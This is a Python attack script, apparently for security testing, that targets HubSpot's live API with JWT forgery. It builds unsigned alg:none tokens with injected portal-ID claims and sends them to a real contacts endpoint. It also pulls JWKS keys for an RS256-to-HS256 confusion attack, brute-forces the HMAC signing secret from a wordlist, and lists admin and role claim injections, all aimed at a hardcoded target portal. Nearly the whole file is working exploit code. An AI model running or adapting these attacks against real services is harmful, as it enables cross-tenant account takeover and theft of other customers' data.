#!/usr/bin/env python3
"""
JWT Token Analysis and Manipulation Attacks
Based on: Analysis of Account Takeover Exploits - Section V
"""

import requests
import json
import base64
import hmac
import hashlib
import os
from dotenv import load_dotenv

load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print("JWT Token Analysis & Manipulation Attacks")
print("="*80)

# ============================================================================
# 1. DECODE AND ANALYZE JWT STRUCTURE
# ============================================================================

def decode_jwt(token):
    """Decode JWT without verification"""
    print("\n[*] Decoding JWT token...")

    parts = token.split('.')

    if len(parts) != 3:
        print(f"  Token has {len(parts)} parts (expected 3 for JWT)")
        return None

    # Decode header
    try:
        # Add padding if needed
        header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        print(f"\n  HEADER:")
        print(f"    {json.dumps(header, indent=4)}")
    except Exception as e:
        print(f"  Could not decode header: {e}")
        header = None

    # Decode payload
    try:
        payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        print(f"\n  PAYLOAD:")
        print(f"    {json.dumps(payload, indent=4)}")

        # Look for portal/hub ID
        payload_str = json.dumps(payload)
        if TARGET_PORTAL in payload_str:
            print(f"\n    *** TARGET PORTAL ID FOUND IN PAYLOAD! ***")

        for key in payload:
            if 'portal' in key.lower() or 'hub' in key.lower():
                print(f"\n    *** Found portal-related claim: {key} = {payload[key]} ***")

    except Exception as e:
        print(f"  Could not decode payload: {e}")
        payload = None

    # Signature
    print(f"\n  SIGNATURE (base64): {parts[2][:50]}...")

    return {
        'header': header,
        'payload': payload,
        'signature': parts[2],
        'parts': parts
    }

# ============================================================================
# 2. ALG: NONE BYPASS ATTACK
# ============================================================================

def test_alg_none_bypass(jwt_data):
    """Try alg: none signature bypass"""
    print("\n[*] Testing alg: none bypass...")

    if not jwt_data or not jwt_data['header']:
        print("  Cannot test - token not decoded")
        return

    # Create new header with alg: none
    new_header = jwt_data['header'].copy()
    new_header['alg'] = 'none'

    # Create new payload with modified portal claim
    new_payload = jwt_data['payload'].copy() if jwt_data['payload'] else {}

    # Try to inject portal ID into various claim names
    claim_names = ['portalId', 'portal_id', 'hubId', 'hub_id', 'accountId', 'account_id']

    for claim in claim_names:
        test_payload = new_payload.copy()
        test_payload[claim] = TARGET_PORTAL

        # Encode header and payload
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(new_header).encode()
        ).decode().rstrip('=')

        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(test_payload).encode()
        ).decode().rstrip('=')

        # Create forged token with alg: none (no signature, but keep trailing dot)
        forged_token = f"{header_encoded}.{payload_encoded}."

        print(f"\n  Testing with claim: {claim} = {TARGET_PORTAL}")
        print(f"  Forged token: {forged_token[:80]}...")

        # Test the forged token
        test_url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?properties=firstname,super_secret,email'
        headers = {'Authorization': f'Bearer {forged_token}'}

        try:
            r = requests.get(test_url, headers=headers, verify=False, timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    print(f"  *** BYPASS SUCCESS! ***")
                    print(f"  Response: {json.dumps(data, indent=4)}")
                    return data
            elif r.status_code != 401:
                print(f"  Unusual response: {r.text[:200]}")
        except Exception as e:
            print(f"  Error: {str(e)[:100]}")

# ============================================================================
# 3. ALGORITHM CONFUSION ATTACK (RS256 -> HS256)
# ============================================================================

def test_algorithm_confusion(jwt_data):
    """Try RS256 -> HS256 algorithm confusion"""
    print("\n[*] Testing algorithm confusion (RS256 -> HS256)...")

    if not jwt_data or not jwt_data['header']:
        print("  Cannot test - token not decoded")
        return

    # First, try to get the public key from JWKS endpoint
    jwks_urls = [
        'https://api.hubapi.com/.well-known/jwks.json',
        'https://app.hubspot.com/.well-known/jwks.json',
        'https://api.hubspot.com/.well-known/jwks.json',
    ]

    public_key = None
    for url in jwks_urls:
        try:
            r = requests.get(url, timeout=10, verify=False)
            if r.status_code == 200:
                print(f"  Found JWKS at: {url}")
                jwks = r.json()
                print(f"  JWKS: {json.dumps(jwks, indent=4)[:500]}")
                # Extract first public key if available
                if 'keys' in jwks and len(jwks['keys']) > 0:
                    public_key = jwks['keys'][0]
                    break
        except:
            pass

    if not public_key:
        print("  Could not retrieve public key from JWKS endpoint")
        print("  Algorithm confusion attack requires the server's public key")
        return

    print(f"  Note: Full algorithm confusion attack requires RSA public key")
    print(f"  Would need to:")
    print(f"    1. Change alg from RS256 to HS256")
    print(f"    2. Sign new token using public key as HMAC secret")
    print(f"    3. Modify payload to include target portal claims")

# ============================================================================
# 4. WEAK SECRET BRUTE FORCE
# ============================================================================

def test_weak_secret():
    """Test if JWT uses weak secret"""
    print("\n[*] Testing for weak HMAC secret...")

    # Common weak secrets from jwt.secrets.list
    weak_secrets = [
        'secret', 'secret1', 'password', 'hubspot', 'SECRET',
        'Secret123', 'admin', 'test', 'dev', 'development',
        'production', 'jwt_secret', 'jwt-secret', '123456',
        'changeme', 'default', 'key', 'private'
    ]

    parts = ACCESS_TOKEN.split('.')
    if len(parts) != 3:
        print("  Token is not a standard JWT format")
        return

    # Try to verify with common secrets
    message = f"{parts[0]}.{parts[1]}"
    actual_signature = parts[2]

    print(f"  Testing {len(weak_secrets)} common secrets...")

    for secret in weak_secrets:
        # Compute HMAC-SHA256
        computed_sig = base64.urlsafe_b64encode(
            hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
        ).decode().rstrip('=')

        if computed_sig == actual_signature:
            print(f"\n  *** SECRET FOUND: '{secret}' ***")
            print(f"  The JWT is signed with a weak secret!")
            print(f"  Can now forge arbitrary tokens!")
            return secret

    print(f"  Secret not in common wordlist (good security)")

# ============================================================================
# 5. JWT PAYLOAD MANIPULATION
# ============================================================================

def test_payload_manipulation(jwt_data):
    """Try manipulating JWT payload claims"""
    print("\n[*] Testing payload claim manipulation...")

    if not jwt_data or not jwt_data['payload']:
        print("  Cannot test - payload not decoded")
        return

    original_payload = jwt_data['payload']

    # Claims to try injecting/modifying
    test_claims = [
        {'portalId': TARGET_PORTAL},
        {'portal_id': TARGET_PORTAL},
        {'hubId': TARGET_PORTAL},
        {'hub_id': TARGET_PORTAL},
        {'accountId': TARGET_PORTAL},
        {'scope': 'crm.objects.contacts.read crm.objects.contacts.write'},
        {'permissions': ['contacts:read', 'contacts:write']},
        {'isAdmin': True},
        {'admin': True},
        {'role': 'admin'},
    ]

    for claims in test_claims:
        print(f"\n  Testing claims: {claims}")

        # Note: Without knowing the signing secret, we can't create valid signatures
        # This test shows what we would try if we had the secret

        new_payload = original_payload.copy()
        new_payload.update(claims)

        print(f"    Would create payload: {json.dumps(new_payload, indent=6)[:200]}...")
        print(f"    (Cannot test without valid signature)")

# ============================================================================
# MAIN EXECUTION
# ============================================================================

print(f"\nAnalyzing token: {ACCESS_TOKEN[:50]}...")

# Decode the token
jwt_data = decode_jwt(ACCESS_TOKEN)

# Run attacks
test_alg_none_bypass(jwt_data)
test_algorithm_confusion(jwt_data)
secret = test_weak_secret()

if secret:
    print(f"\n!!! CRITICAL: Token uses weak secret: '{secret}' !!!")
    print(f"Can forge arbitrary tokens with any portal ID!")
else:
    test_payload_manipulation(jwt_data)

print("\n" + "="*80)
print("JWT Analysis Complete")
print("="*80)
print("""
NEXT STEPS:

If we found the signing secret:
  1. Modify payload to include target portal claims
  2. Re-sign token with discovered secret
  3. Test modified token against API

If alg: none worked:
  1. The server accepts unsigned tokens
  2. This is a critical vulnerability
  3. Report immediately

If algorithm confusion is possible:
  1. Need to implement full RS256->HS256 attack
  2. Requires cryptography library and public key manipulation
  3. Can forge tokens if successful

If none worked:
  - HubSpot properly validates JWT signatures
  - Cannot forge tokens without the secret
  - Authorization is enforced at token level
""")
